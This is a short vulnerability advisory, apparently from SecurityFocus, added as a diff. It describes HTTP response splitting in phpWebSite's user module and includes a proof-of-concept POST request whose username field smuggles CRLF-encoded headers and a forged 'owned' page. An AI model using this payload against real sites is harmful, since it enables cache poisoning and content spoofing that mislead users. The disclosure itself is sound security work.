@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/11673/info
+
+A remote HTTP response splitting vulnerability reportedly affects phpWebSite in its user module. This issue is due to a failure of the application to properly sanitize user-supplied input.
+
+A remote attacker may exploit this vulnerability to influence or misrepresent how web content is served, cached or interpreted. This could aid in various attacks that attempt to entice client users into a false sense of trust.
+
+POST /index.php HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-length: 218
+Connection: Keep-Alive
+
+http://www.example.com/module=user&norm_user_op=login&block_username=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20Ok%0d%0aContent-Length:%2031%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>This site in 0wned{/html}&password=foobar
